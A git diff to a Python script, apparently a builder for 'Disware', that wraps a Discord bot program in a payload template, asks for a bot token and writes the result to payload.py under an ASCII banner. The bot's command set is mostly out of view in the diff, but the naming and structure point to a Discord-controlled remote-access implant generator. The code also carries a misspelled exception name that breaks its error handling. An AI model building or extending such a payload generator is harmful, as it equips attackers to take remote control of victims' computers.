@@ -1,4 +1,10 @@
 import os
+import colorama
+from colorama import Fore, Style
+
+def generate_payload(token):
+    payload_template = r"""
+import os
 import discord
 import time
 import shutil
@@ -120,4 +126,24 @@ async def ping(ctx):
     latency = round(bot.latency * 1000)
     await ctx.send(f'🏓 Pong! {latency}ms')
 
-bot.run('PUT YOUR GOOFY AHH TOKEN)
+bot.run('{token}')
+"""
+    return payload_template
+
+if __name__ == "__main__":
+    print(Fore.MAGENTA, """
+ ________  .__                                       
+\______ \ |__| ________  _  _______ _______   ____
+ |    |  \|  |/  ___/\ \/ \/ /\__  \\_  __ \_/ __ \
+ |    `   \  |\___ \  \     /  / __ \|  | \/\  ___/
+/_______  /__/____  >  \/\_/  (____  /__|    \___  >
+        \/        \/               \/            \/
+    """, Style.RESET_ALL)
+    token = input("Enter your Discord bot token: ")
+    try:
+        payload = generate_payload(token)
+        with open("payload.py", "w") as file:
+            file.write(payload)
+        print(Fore.GREEN, f"Payload created and saved as payload.py")
+    except Execption as e:
+     print(Fore.RED,"An error occured :",e)
